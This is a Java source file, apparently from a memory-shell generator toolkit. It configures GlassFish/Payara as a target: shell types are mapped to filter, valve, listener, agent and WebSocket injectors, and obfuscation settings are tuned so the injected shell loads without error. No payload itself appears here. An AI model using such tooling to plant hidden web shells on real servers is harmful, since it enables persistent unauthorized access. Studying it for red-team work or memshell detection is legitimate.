package com.reajason.javaweb.memshell.server.glassfish;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import java.util.Collections;
import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/12
 */
public class GlassFish extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                try {
                    response = ShellCommonUtil.getFieldValue(request, "response");
                } catch (Exception ee) {
                    // glassfish7
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "reqFacHelper"), "response");
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public Map<String, Object> getShellObfuscationOptionOverrides(String shellType) {
        if (AGENT_FILTER_CHAIN.equals(shellType) || CATALINA_AGENT_CONTEXT_VALVE.equals(shellType)) {
            // 两种 Agent 注入器把 shell defineClass 进 ApplicationFilterChain /
            // StandardContextValve 的 defining loader。GlassFish/Payara 上这两个类属于
            // OSGi bundle（Felix，org.glassfish.main.web.core 等），bundle 未 import
            // javax.crypto，AES 解密例程会在 <clinit> 抛 NoClassDefFoundError，
            // 随后被注入代码的 catch (Throwable) 静默吞掉。
            return Collections.singletonMap("enableAES", false);
        }
        return super.getShellObfuscationOptionOverrides(shellType);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishWebSocketInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishRawWsInjector")
                .addInjector(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishRawWsInjector")
                .build();
    }

    /**
     * GlassFish/Payara 的 HTTP 连接器是 Grizzly，RawWebSocket 需要按 shell 类名派生
     * 独立的 Grizzly helper，由注入器先 defineClass 再实例化 shell。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())
                || JAKARTA_RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(GlassFishRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
